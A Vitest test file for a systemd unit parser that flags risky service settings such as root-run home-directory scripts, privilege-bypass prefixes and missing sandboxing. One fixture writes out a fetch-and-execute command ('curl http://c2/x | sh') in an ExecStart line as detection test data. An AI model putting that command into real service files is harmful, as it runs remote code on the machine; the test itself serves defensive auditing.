import { describe, expect, it } from "vitest";
import { parseSystemdUnit } from "./logic";

const svc = (body: string) => `[Service]\n${body}\n`;

describe("parseSystemdUnit", () => {
  it("parses directives with their section", () => {
    const r = parseSystemdUnit("[Unit]\nDescription=x\n[Service]\nExecStart=/bin/true\n");
    expect(r.directives).toContainEqual({ section: "Unit", key: "Description", value: "x" });
    expect(r.directives).toContainEqual({ section: "Service", key: "ExecStart", value: "/bin/true" });
  });

  it("flags a root service running a /home ExecStart as high", () => {
    const r = parseSystemdUnit(svc("User=root\nExecStart=/home/deploy/run.sh"));
    expect(r.findings.some((f) => f.severity === "high" && /user-writable/.test(f.message))).toBe(
      true,
    );
  });

  it("flags a relative ExecStart as medium", () => {
    const r = parseSystemdUnit(svc("ExecStart=run.sh --daemon"));
    expect(r.findings.some((f) => f.severity === "medium" && /Relative ExecStart/.test(f.message))).toBe(
      true,
    );
  });

  it("flags a '+' prefix that bypasses a non-root User=", () => {
    const r = parseSystemdUnit(svc("User=nobody\nExecStart=+/opt/app/priv"));
    expect(r.findings.some((f) => f.severity === "high" && /bypassing User=nobody/.test(f.message))).toBe(
      true,
    );
  });

  it("flags download-piped-to-shell", () => {
    const r = parseSystemdUnit(svc("ExecStart=/bin/sh -c 'curl http://c2/x | sh'"));
    expect(r.findings.some((f) => f.severity === "high" && /pipes to a shell/.test(f.message))).toBe(
      true,
    );
  });

  it("flags a secret in Environment=", () => {
    const r = parseSystemdUnit(svc("ExecStart=/bin/true\nEnvironment=API_TOKEN=abc123"));
    expect(r.findings.some((f) => f.severity === "medium" && /secret in Environment/.test(f.message))).toBe(
      true,
    );
  });

  it("notes missing hardening on a root service", () => {
    const r = parseSystemdUnit(svc("User=root\nExecStart=/usr/bin/app"));
    expect(r.findings.some((f) => f.severity === "info" && /sandboxing/.test(f.message))).toBe(true);
  });

  it("does not note missing hardening when NoNewPrivileges is set", () => {
    const r = parseSystemdUnit(svc("User=root\nExecStart=/usr/bin/app\nNoNewPrivileges=true"));
    expect(r.findings.some((f) => /sandboxing/.test(f.message))).toBe(false);
  });

  it("errors when nothing parses", () => {
    expect(parseSystemdUnit("just prose, no directives").error).not.toBe("");
  });
});
